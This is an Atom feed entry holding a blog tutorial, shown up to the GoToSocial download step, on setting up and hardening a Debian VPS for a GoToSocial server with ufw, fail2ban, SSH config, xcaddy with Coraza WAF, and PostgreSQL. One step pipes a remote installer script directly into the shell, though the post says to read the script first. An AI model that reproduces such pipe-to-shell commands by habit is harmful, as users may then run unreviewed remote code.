<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://ovelny.sh/">
  <id>https://ovelny.sh/</id>
  <title>ovelny</title>
  <updated>2025-01-06T00:00:00Z</updated>
  <link rel="alternate" href="https://ovelny.sh/" type="text/html"/>
  <link rel="self" href="https://ovelny.sh/atom.xml" type="application/atom+xml"/>
  <author>
    <name>ovelny</name>
    <uri>https://ovelny.sh</uri>
  </author>
  <entry>
    <id>tag:ovelny.sh,2025-01-06:/blog/a-complete-guide-for-your-gotosocial-server/</id>
    <title type="html">A complete guide for your GoToSocial server</title>
    <published>2025-01-06T00:00:00Z</published>
    <updated>2025-01-06T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/a-complete-guide-for-your-gotosocial-server/" type="text/html"/>
    <content type="html">&lt;p&gt;&lt;a href="https://gotosocial.org/" rel="nofollow"&gt;GoToSocial&lt;/a&gt; is an &lt;a href="https://activitypub.rocks/" rel="nofollow"&gt;ActivityPub&lt;/a&gt; server that lets you interact with your friends on the Fediverse. It&amp;#39;s written in Golang and is very lightweight compared to other softwares, especially Mastodon. It&amp;#39;s not particularly designed to host large communities, sure, but it has the advantage of being easier to maintain and can run on any cheap VPS: 1 CPU core, 1 GB of memory and 15-20GB of available space is all you need. Even a single-board computer will do.&lt;/p&gt;

&lt;p&gt;Plus, it has an amazing set of requirements for &lt;a href="https://github.com/superseriousbusiness/gotosocial#corporate-sponsorship" rel="nofollow"&gt;corporate sponsorship&lt;/a&gt;! Something that many open-source projects should take a page from.&lt;/p&gt;

&lt;p&gt;For all these reasons, I picked this server for my upcoming single-user instance. It might grow and host a few folks later on, but a large userbase is definitely &lt;em&gt;not&lt;/em&gt; something I&amp;#39;ll need.&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://docs.gotosocial.org/en/latest/" rel="nofollow"&gt;official documentation&lt;/a&gt; is already exhaustive, but I want to make an attempt at a fully fledged guide, one that covers more than the instance setup:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Initial VPS setup and hardening.&lt;/li&gt;
&lt;li&gt;Reverse proxying with &lt;a href="https://caddyserver.com/" rel="nofollow"&gt;Caddy&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;More hardening with &lt;a href="https://github.com/fail2ban/fail2ban" rel="nofollow"&gt;fail2ban&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Additional rate limiting.&lt;/li&gt;
&lt;li&gt;Web Application Firewall setup with &lt;a href="https://owasp.org/www-project-coraza-web-application-firewall/" rel="nofollow"&gt;OWASP Coraza&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Automated backups with &lt;a href="https://restic.net/" rel="nofollow"&gt;restic&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will also set up GoToSocial with a &lt;a href="https://docs.gotosocial.org/en/latest/advanced/host-account-domain/" rel="nofollow"&gt;split-domain deployment&lt;/a&gt;, so we can have usernames like &lt;code&gt;@user@example.net&lt;/code&gt;, even if the instance is running on a subdomain such as &lt;code&gt;gts.example.net&lt;/code&gt;. That way, you can use the domain for anything else you want, such as a custom landing page.&lt;/p&gt;

&lt;p&gt;This guide is provider-agnostic, but we will use Debian (currently version 12) on top of the aforementioned tools.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Important note&lt;/strong&gt;: all fields surrounded by brackets in this guide, like &lt;code&gt;&amp;lt;this&amp;gt;&lt;/code&gt;, are values to replace accordingly, depending on context that will be specified.&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s get started, assuming you already got a domain and subdomain tied to your VPS IP. Even if this guide aims for completeness, don&amp;#39;t hesitate to search and investigate for more details, and be sure to check the references at the end.&lt;/p&gt;

&lt;h2&gt;Basic VPS setup and hardening&lt;/h2&gt;

&lt;p&gt;Your provider most likely has a dashboard to let you upload your SSH public key, so you can SSH in your VPS once it&amp;#39;s deployed. Let&amp;#39;s log in with &lt;code&gt;ssh root@&amp;lt;VPS IP address&amp;gt;&lt;/code&gt; and work on hardening the server first:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Create a user for yourself and&lt;/span&gt;
&lt;span class="c"&gt;# grant it admin privileges:&lt;/span&gt;
adduser &amp;lt;username&amp;gt;
usermod &lt;span class="nt"&gt;-aG&lt;/span&gt; &lt;span class="nb"&gt;sudo&lt;/span&gt; &amp;lt;username&amp;gt;

&lt;span class="c"&gt;# Switch to your newly created user:&lt;/span&gt;
su &amp;lt;username&amp;gt;

&lt;span class="c"&gt;# Move root's authorized_keys so you can SSH with this user:&lt;/span&gt;
&lt;span class="nb"&gt;mkdir&lt;/span&gt; ~/.ssh
&lt;span class="nb"&gt;sudo mv&lt;/span&gt; /root/.ssh/authorized_keys ~/.ssh/

&lt;span class="c"&gt;# Change permissions accordingly:&lt;/span&gt;
&lt;span class="nb"&gt;sudo chown&lt;/span&gt; &amp;lt;username&amp;gt;:&amp;lt;username&amp;gt; ~/.ssh/authorized_keys
&lt;span class="nb"&gt;chmod &lt;/span&gt;700 ~/.ssh

&lt;span class="c"&gt;# Set root shell to nologin and lock the account:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;usermod root &lt;span class="nt"&gt;--shell&lt;/span&gt; /sbin/nologin
&lt;span class="nb"&gt;sudo &lt;/span&gt;passwd &lt;span class="nt"&gt;--lock&lt;/span&gt; root

&lt;span class="c"&gt;# Update everything:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;sudo &lt;/span&gt;apt full-upgrade

&lt;span class="c"&gt;# Install and setup ufw:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;ufw
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw default deny outgoing comment &lt;span class="s1"&gt;'Deny all outgoing traffic'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw default deny incoming comment &lt;span class="s1"&gt;'Deny all incoming traffic'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw limit &lt;span class="k"&gt;in &lt;/span&gt;ssh &lt;span class="c"&gt;# we don't wanna lock ourselves out, do we?&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow out 53 comment &lt;span class="s1"&gt;'Allow DNS calls out'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow out 123 comment &lt;span class="s1"&gt;'Allow NTP out'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow out http comment &lt;span class="s1"&gt;'Allow HTTP traffic out'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow out https comment &lt;span class="s1"&gt;'Allow HTTPS traffic out'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow out whois comment &lt;span class="s1"&gt;'Allow WHOIS'&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow &lt;span class="k"&gt;in &lt;/span&gt;http &lt;span class="c"&gt;# for GoToSocial&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw allow &lt;span class="k"&gt;in &lt;/span&gt;https &lt;span class="c"&gt;# for Caddy&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw &lt;span class="nb"&gt;enable
sudo &lt;/span&gt;ufw status verbose &lt;span class="c"&gt;# check that everything is set up&lt;/span&gt;

&lt;span class="c"&gt;# Set up your timezone. Replace &amp;lt;your timezone&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;# with any value found by running `timedatectl list-timezones`:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;timedatectl set-timezone &amp;lt;your timezone&amp;gt;

&lt;span class="c"&gt;# Set up unattended-upgrades:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;unattended-upgrades
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl status unattended-upgrades &lt;span class="c"&gt;# check if service is loaded and active&lt;/span&gt;

&lt;span class="c"&gt;# Set up fail2ban:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;fail2ban
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl status fail2ban &lt;span class="c"&gt;# check if fail2ban is loaded and active&lt;/span&gt;

&lt;span class="c"&gt;# Create a group for SSH users, for easier management:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;groupadd sshusers

&lt;span class="c"&gt;# Create a group to limit su usage:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;groupadd suusers

&lt;span class="c"&gt;# Restrict /bin/su usage to members of suusers group:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;dpkg-statoverride &lt;span class="nt"&gt;--update&lt;/span&gt; &lt;span class="nt"&gt;--add&lt;/span&gt; root suusers 4750 /bin/su

&lt;span class="c"&gt;# Add ourselves to both groups:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;usermod &lt;span class="nt"&gt;-aG&lt;/span&gt; sshusers &amp;lt;username&amp;gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;usermod &lt;span class="nt"&gt;-aG&lt;/span&gt; suusers &amp;lt;username&amp;gt;

&lt;span class="c"&gt;# Configure swap space and swappiness.&lt;/span&gt;
&lt;span class="c"&gt;# A decent rule of thumb for swap space is the following:&lt;/span&gt;
&lt;span class="c"&gt;# * Less than 2GB of RAM: swap == RAM * 2.&lt;/span&gt;
&lt;span class="c"&gt;# * More than 2GB of RAM: swap == RAM, up to 8G.&lt;/span&gt;
&lt;span class="c"&gt;# Use free -h to get your current swap space.&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;fallocate &lt;span class="nt"&gt;-l&lt;/span&gt; &amp;lt;swap size, i.e. 4G&amp;gt; /swapfile
&lt;span class="nb"&gt;ls&lt;/span&gt; &lt;span class="nt"&gt;-lsah&lt;/span&gt; /swapfile &lt;span class="c"&gt;# make sure the correct amount of space has been allocated&lt;/span&gt;
&lt;span class="nb"&gt;sudo chmod &lt;/span&gt;600 /swapfile &lt;span class="c"&gt;# make file only accessible by root&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;mkswap /swapfile &lt;span class="c"&gt;# define file as swap space&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;swapon /swapfile &lt;span class="c"&gt;# enable swap space&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;swapon &lt;span class="nt"&gt;--show&lt;/span&gt; &lt;span class="c"&gt;# check that swap is available&lt;/span&gt;
free &lt;span class="nt"&gt;-h&lt;/span&gt; &lt;span class="c"&gt;# check again with free, just in case&lt;/span&gt;
&lt;span class="nb"&gt;sudo cp&lt;/span&gt; /etc/fstab /etc/fstab.bak &lt;span class="c"&gt;# backup fstab file in case anything goes wrong&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'/swapfile none swap sw 0 0'&lt;/span&gt; | &lt;span class="nb"&gt;sudo tee&lt;/span&gt; &lt;span class="nt"&gt;-a&lt;/span&gt; /etc/fstab &lt;span class="c"&gt;# add swap file permanently to /etc/fstab&lt;/span&gt;
&lt;span class="nb"&gt;cat&lt;/span&gt; /proc/sys/vm/swappiness &lt;span class="c"&gt;# check current swappiness value&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl vm.swappiness&lt;span class="o"&gt;=&lt;/span&gt;10 &lt;span class="c"&gt;# change swappiness for a server value, to avoid swapping too early&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;vi /etc/sysctl.conf &lt;span class="c"&gt;# edit settings to make this change permanent&lt;/span&gt;
vm.swappiness&lt;span class="o"&gt;=&lt;/span&gt;10 &lt;span class="c"&gt;# add the following line at the very bottom of sysctl.conf&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Next, remove everything in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; and replace it with the following. Be sure to change &lt;code&gt;&amp;lt;XXXX&amp;gt;&lt;/code&gt; in the first line with a port number of your choice. This is merely security by obscurity, but changing it is easy and may avoid some log spam:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Port &amp;lt;XXXX&amp;gt;
Protocol 2
LoginGraceTime 1m
MaxAuthTries 3
MaxSessions 2
MaxStartups 2
ClientAliveInterval 180
ClientAliveCountMax 0
LogLevel VERBOSE
PermitRootLogin no
PermitUserEnvironment no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
AllowGroups sshusers
X11Forwarding no
UsePAM yes
AllowTcpForwarding no
AllowStreamLocalForwarding no
GatewayPorts no
PermitTunnel no
IgnoreRhosts yes
HostbasedAuthentication no
UseDNS yes
Compression no
TCPKeepAlive no
AllowAgentForwarding no
PrintMotd no
PrintLastLog no
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Allow your custom SSH port in &lt;code&gt;ufw&lt;/code&gt; with &lt;code&gt;sudo ufw limit in &amp;lt;XXXX&amp;gt;/tcp&lt;/code&gt;. Delete your previous SSH rules with &lt;code&gt;sudo ufw status numbered&lt;/code&gt; and choosing the rule&amp;#39;s IDs with &lt;code&gt;sudo ufw delete &amp;lt;ID&amp;gt;&lt;/code&gt;. Be sure to also delete the &lt;code&gt;(v6)&lt;/code&gt; rules.&lt;/p&gt;

&lt;p&gt;Apply changes by restarting sshd with &lt;code&gt;sudo systemctl restart ssh&lt;/code&gt;. Check that your custom port has been applied with &lt;code&gt;sudo systemctl status ssh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Create &lt;code&gt;/etc/fail2ban/jail.local&lt;/code&gt; with the following configuration, be sure to specify the same SSH port we used in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight toml"&gt;&lt;code&gt;&lt;span class="nn"&gt;[DEFAULT]&lt;/span&gt;
&lt;span class="py"&gt;bantime&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;d&lt;/span&gt;
&lt;span class="py"&gt;findtime&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="err"&gt;m&lt;/span&gt;
&lt;span class="py"&gt;maxretry&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="py"&gt;backend&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;auto&lt;/span&gt;

&lt;span class="nn"&gt;[sshd]&lt;/span&gt;
&lt;span class="py"&gt;enabled&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="py"&gt;port&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;XXXX&amp;gt;&lt;/span&gt;
&lt;span class="py"&gt;banaction&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;ufw&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Apply changes by restarting fail2ban with &lt;code&gt;sudo systemctl restart fail2ban&lt;/code&gt;. Check that the service is active and loaded with &lt;code&gt;sudo systemctl status fail2ban&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This might be a good time to log out and log back in, just to check that everything is working as expected. Make sure to use your username and custom port to log back in.&lt;/p&gt;

&lt;h2&gt;Base packages installation&lt;/h2&gt;

&lt;p&gt;Before configuring anything, let&amp;#39;s install the base packages you will need with the following commands:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Install required apt packages:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;debian-keyring debian-archive-keyring curl apt-transport-https restic gpg gpg-agent libnss3-tools git man-db postgresql postgresql-contrib sshpass

&lt;span class="c"&gt;# Update restic to latest version:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;restic self-update

&lt;span class="c"&gt;# Add cloudsmith repo for xcaddy:&lt;/span&gt;
curl &lt;span class="nt"&gt;-1sLf&lt;/span&gt; &lt;span class="s1"&gt;'https://dl.cloudsmith.io/public/caddy/xcaddy/gpg.key'&lt;/span&gt; | &lt;span class="nb"&gt;sudo &lt;/span&gt;gpg &lt;span class="nt"&gt;--dearmor&lt;/span&gt; &lt;span class="nt"&gt;-o&lt;/span&gt; /usr/share/keyrings/caddy-xcaddy-archive-keyring.gpg
curl &lt;span class="nt"&gt;-1sLf&lt;/span&gt; &lt;span class="s1"&gt;'https://dl.cloudsmith.io/public/caddy/xcaddy/debian.deb.txt'&lt;/span&gt; | &lt;span class="nb"&gt;sudo tee&lt;/span&gt; /etc/apt/sources.list.d/caddy-xcaddy.list

&lt;span class="c"&gt;# Install xcaddy:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt update
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;xcaddy

&lt;span class="c"&gt;# Install go with g: https://github.com/stefanmaric/g&lt;/span&gt;
&lt;span class="c"&gt;# Read the script first before running it, and pick&lt;/span&gt;
&lt;span class="c"&gt;# default settings along with latest go version install:&lt;/span&gt;
curl &lt;span class="nt"&gt;-sSL&lt;/span&gt; https://git.io/g-install | sh &lt;span class="nt"&gt;-s&lt;/span&gt;

&lt;span class="c"&gt;# Apply changes made to $PATH:&lt;/span&gt;
&lt;span class="nb"&gt;source&lt;/span&gt; ~/.bashrc

&lt;span class="c"&gt;# Install gopass:&lt;/span&gt;
go &lt;span class="nb"&gt;install &lt;/span&gt;github.com/gopasspw/gopass@latest

&lt;span class="c"&gt;# Install gotop. It's a graphical activity monitor I like,&lt;/span&gt;
&lt;span class="c"&gt;# completely optional:&lt;/span&gt;
go &lt;span class="nb"&gt;install &lt;/span&gt;github.com/xxxserxxx/gotop/v4/cmd/gotop@latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;xcaddy setup&lt;/h2&gt;

&lt;p&gt;To install Caddy, let&amp;#39;s use &lt;a href="https://github.com/caddyserver/xcaddy" rel="nofollow"&gt;xcaddy&lt;/a&gt; so you can build it with additional plugins: the ones you must pick for this guide are &lt;a href="https://github.com/mholt/caddy-ratelimit" rel="nofollow"&gt;caddy-ratelimit&lt;/a&gt;, &lt;a href="https://github.com/caddyserver/transform-encoder" rel="nofollow"&gt;transform-encoder&lt;/a&gt; and &lt;a href="https://github.com/corazawaf/coraza-caddy" rel="nofollow"&gt;coraza-caddy&lt;/a&gt;, respectively for rate limiting, easier log parsing with fail2ban, and Coraza WAF.&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Build caddy with ratelimit, transform-encoder and Coraza WAF plugins.&lt;/span&gt;
&lt;span class="c"&gt;# The environment variable is used to fix a RAM consumption issue with&lt;/span&gt;
&lt;span class="c"&gt;# Coraza, as shown here: https://github.com/corazawaf/coraza-caddy/issues/76&lt;/span&gt;
&lt;span class="nv"&gt;XCADDY_GO_BUILD_FLAGS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'-tags=memoize_builders'&lt;/span&gt; xcaddy build &lt;span class="nt"&gt;--with&lt;/span&gt; github.com/mholt/caddy-ratelimit &lt;span class="nt"&gt;--with&lt;/span&gt; github.com/caddyserver/transform-encoder &lt;span class="nt"&gt;--with&lt;/span&gt; github.com/corazawaf/coraza-caddy/v2

&lt;span class="c"&gt;# Create a system group for caddy:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;groupadd &lt;span class="nt"&gt;--system&lt;/span&gt; caddy

&lt;span class="c"&gt;# Create a system user for caddy:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;useradd &lt;span class="nt"&gt;--system&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--gid&lt;/span&gt; caddy &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--create-home&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--home-dir&lt;/span&gt; /var/lib/caddy &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--shell&lt;/span&gt; /usr/sbin/nologin &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--comment&lt;/span&gt; &lt;span class="s1"&gt;'Caddy web server'&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    caddy

&lt;span class="c"&gt;# Limit permissions for caddy binary&lt;/span&gt;
&lt;span class="c"&gt;# and move it into $PATH:&lt;/span&gt;
&lt;span class="nb"&gt;sudo chmod &lt;/span&gt;&lt;span class="nv"&gt;u&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;x,g&lt;span class="o"&gt;=&lt;/span&gt;x,o-rwx caddy
&lt;span class="nb"&gt;sudo chown &lt;/span&gt;caddy:caddy caddy
&lt;span class="nb"&gt;sudo mv &lt;/span&gt;caddy /usr/bin/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Add the following systemd unit file in &lt;code&gt;/etc/systemd/system/caddy.service&lt;/code&gt;, which can be found &lt;a href="https://github.com/caddyserver/dist/blob/master/init/caddy.service" rel="nofollow"&gt;here&lt;/a&gt;. Let&amp;#39;s just add restart directives to it, in case it crashes:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight systemd"&gt;&lt;code&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="nt"&gt;Description&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;Caddy
&lt;span class="nt"&gt;Documentation&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;https://caddyserver.com/docs/
&lt;span class="nt"&gt;After&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;network.target network-online.target
&lt;span class="nt"&gt;Requires&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;network-online.target

&lt;span class="k"&gt;[Service]&lt;/span&gt;
&lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;notify
&lt;span class="nt"&gt;User&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;caddy
&lt;span class="nt"&gt;Group&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;caddy
&lt;span class="nt"&gt;ExecStart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;/usr/bin/caddy run --environ --config /etc/caddy/Caddyfile
&lt;span class="nt"&gt;ExecReload&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;/usr/bin/caddy reload --config /etc/caddy/Caddyfile --force
&lt;span class="nt"&gt;RestartPreventExitStatus&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;1
&lt;span class="nt"&gt;Restart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;on-failure
&lt;span class="nt"&gt;RestartSec&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;5s
&lt;span class="nt"&gt;TimeoutStopSec&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;5s
&lt;span class="nt"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;1048576
&lt;span class="nt"&gt;PrivateTmp&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;true
&lt;span class="nt"&gt;ProtectSystem&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;full
&lt;span class="nt"&gt;AmbientCapabilities&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;CAP_NET_ADMIN CAP_NET_BIND_SERVICE

&lt;span class="k"&gt;[Install]&lt;/span&gt;
&lt;span class="nt"&gt;WantedBy&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;multi-user.target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Create an empty CaddyFile and its directory for the service you just created. This file will contain all of your reverse proxying logic:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo mkdir&lt;/span&gt; /etc/caddy
&lt;span class="nb"&gt;sudo touch&lt;/span&gt; /etc/caddy/Caddyfile
&lt;span class="nb"&gt;sudo chown&lt;/span&gt; &lt;span class="nt"&gt;-R&lt;/span&gt; caddy:caddy /etc/caddy &lt;span class="c"&gt;# limit owner and group to caddy&lt;/span&gt;
&lt;span class="nb"&gt;sudo chmod &lt;/span&gt;o-rwx /etc/caddy/Caddyfile &lt;span class="c"&gt;# change permissions accordingly&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let&amp;#39;s make a quick test by adding the following in your &lt;code&gt;/etc/caddy/Caddyfile&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;localhost:8089 {
        respond "hey there"
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You&amp;#39;re now ready to start the service and see if it runs:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl daemon-reload
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; &lt;span class="nt"&gt;--now&lt;/span&gt; caddy
systemctl status caddy &lt;span class="c"&gt;# check if caddy is loaded and active&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If caddy is working as expected, run the following to install the root CA certificate and check your Caddyfile test:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;caddy trust
curl https://localhost:8089
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If you got a response, you have your basic setup! Let&amp;#39;s stop caddy for now with &lt;code&gt;sudo caddy stop&lt;/code&gt; until you have a complete &lt;code&gt;Caddyfile&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;PostgreSQL installation and setup&lt;/h2&gt;

&lt;p&gt;We will use PostgreSQL as the database of your GoToSocial instance: while more complex, it can be the right choice in case your instance grows larger than anticiped. For small instances, SQLite can be used, but keep in mind that migrating from SQLite to PostgreSQL or the other way around is a manual process, and can quickly become a nightmare on its own.&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Start and enable PostgreSQL service:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl start postgresql.service
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl &lt;span class="nb"&gt;enable &lt;/span&gt;postgresql.service

&lt;span class="c"&gt;# Check that PostgreSQL is running:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;systemctl status postgresql.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;GoToSocial installation and setup&lt;/h2&gt;

&lt;p&gt;Just like caddy, let&amp;#39;s make a system group and user for GoToSocial:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Create a system group for gotosocial:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;groupadd &lt;span class="nt"&gt;--system&lt;/span&gt; gotosocial

&lt;span class="c"&gt;# Create a system user for gotosocial:&lt;/span&gt;
&lt;span class="nb"&gt;sudo &lt;/span&gt;useradd &lt;span class="nt"&gt;--system&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--gid&lt;/span&gt; gotosocial &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--create-home&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--home-dir&lt;/span&gt; /var/lib/gotosocial &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--shell&lt;/span&gt; /usr/sbin/nologin &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--comment&lt;/span&gt; &lt;span class="s1"&gt;'GoToSocial server'&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    gotosocial
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then, let&amp;#39;s download and extract GoToSocial:&lt;/p&gt;

